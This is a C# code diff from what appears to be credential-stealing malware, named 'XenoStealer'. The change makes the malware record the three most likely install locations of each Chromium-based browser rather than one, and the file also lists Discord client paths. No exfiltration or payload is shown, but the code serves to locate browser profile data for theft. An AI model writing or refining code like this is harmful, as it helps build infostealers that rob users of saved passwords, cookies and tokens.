@@ -12,30 +12,43 @@ namespace XenoStealer
         static Configuration() 
         {
             string[] browsers = Utils.GetInstalledBrowsers();
-            foreach (string browser in ChromiumBrowsers.Keys) 
+            foreach (string browser in ChromiumBrowsers.Keys)
             {
                 string dataPath = RemoveEnvVarFromPath(ChromiumBrowsers[browser]).ToLower();
                 string endName = new DirectoryInfo(dataPath).Name;
-                if (endName.Contains("user")) 
+                if (endName.Contains("user"))
                 {
-                    dataPath = dataPath.Substring(0, dataPath.Length-endName.Length-1);//-1 for the backslash
+                    dataPath = dataPath.Substring(0, dataPath.Length - endName.Length - 1); // -1 for the backslash
                 }
 
-                string bestLibraryPath = null;
-                double maxResult = double.MinValue;
+                // List to store the top 3 results (with library paths and similarity scores)
+                List<(string LibraryPath, double Similarity)> topResults = new List<(string, double)>();
 
                 foreach (string LibraryPath in browsers)
                 {
                     string filtered = RemoveEnvVarFromPath(Path.GetDirectoryName(LibraryPath)).ToLower();
                     double result = Utils.CalculateStringSimilarity(filtered, dataPath);
 
-                    if (result > maxResult)
+                    // If the list has less than 3 results, simply add the new result
+                    if (topResults.Count < 3)
                     {
-                        maxResult = result;
-                        bestLibraryPath = LibraryPath;
+                        topResults.Add((LibraryPath, result));
+                    }
+                    else
+                    {
+                        // If the current result is better than the worst in the top 3, replace it
+                        var minResult = topResults.OrderBy(x => x.Similarity).First();
+                        if (result > minResult.Similarity)
+                        {
+                            topResults.Remove(minResult); // Remove the worst result
+                            topResults.Add((LibraryPath, result)); // Add the new better result
+                        }
                     }
                 }
-                ChromiumBrowsersLikelyLocations[browser]= bestLibraryPath;
+
+                topResults = topResults.OrderByDescending(x => x.Similarity).ToList();
+
+                ChromiumBrowsersLikelyLocations[browser] = topResults.Select(x => x.LibraryPath).ToArray();
             }
         }
 
@@ -102,7 +115,7 @@ namespace XenoStealer
             $"{roamingAppData}\\Lightcord"
         };
 
-        public static Dictionary<string, string> ChromiumBrowsersLikelyLocations = new Dictionary<string, string>
+        public static Dictionary<string, string[]> ChromiumBrowsersLikelyLocations = new Dictionary<string, string[]>
         {
 
         };
